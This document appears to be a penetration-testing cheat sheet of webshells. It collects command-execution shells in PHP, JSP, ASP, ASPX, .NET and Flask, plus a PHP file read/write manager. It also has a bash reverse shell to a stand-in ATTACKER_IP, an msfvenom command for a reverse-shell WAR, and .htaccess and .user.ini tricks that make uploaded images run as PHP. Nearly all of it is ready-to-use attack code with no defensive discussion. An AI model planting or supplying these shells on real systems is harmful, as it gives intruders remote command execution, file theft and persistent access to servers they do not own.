# Webshells

## PHP One-Liner
```php
<?php system($_GET['cmd']);?>
<?php echo shell_exec($_GET['cmd']);?>
<?php passthru($_GET['cmd']);?>
<?php exec($_GET['cmd'],$o);print_r($o);?>
<?php echo `<pre>` . shell_exec($_GET['cmd']) . `</pre>`;?>
```

## PHP Mini Shell
```php
<?php if(isset($_REQUEST['cmd'])){echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>";}?>
```

## PHP Full Shell
```php
<?php
if(isset($_GET['cmd'])){
    echo '<pre>';
    $cmd = $_GET['cmd'];
    system($cmd);
    echo '</pre>';
}
?>
```

## PHP File Manager
```php
<?php
if(isset($_GET['file'])){
    echo file_get_contents($_GET['file']);
}
if(isset($_POST['write'])){
    file_put_contents($_POST['file'],$_POST['data']);
}
?>
```

## PHP Reverse Shell
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

## JSP Shell
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b));}%>
```

## ASP Shell
```asp
<%Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll())%>
```

## ASPX Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["cmd"];
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
```

## Python Shell (Flask)
```python
from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

## Tomcat WAR Shell
```bash
# Generate WAR with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
```

## .NET Shell
```aspx
<%@ Page Language="C#" AutoEventWireup="true" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + Request["cmd"];
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.Start();
        Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
    }
</script>
```

## .htaccess Shell
```
AddType application/x-httpd-php .jpg
# Upload this .htaccess + a .jpg file with PHP code
```

## .user.ini Shell
```
auto_prepend_file=shell.jpg
# Upload this .user.ini + a .jpg file with PHP code
```
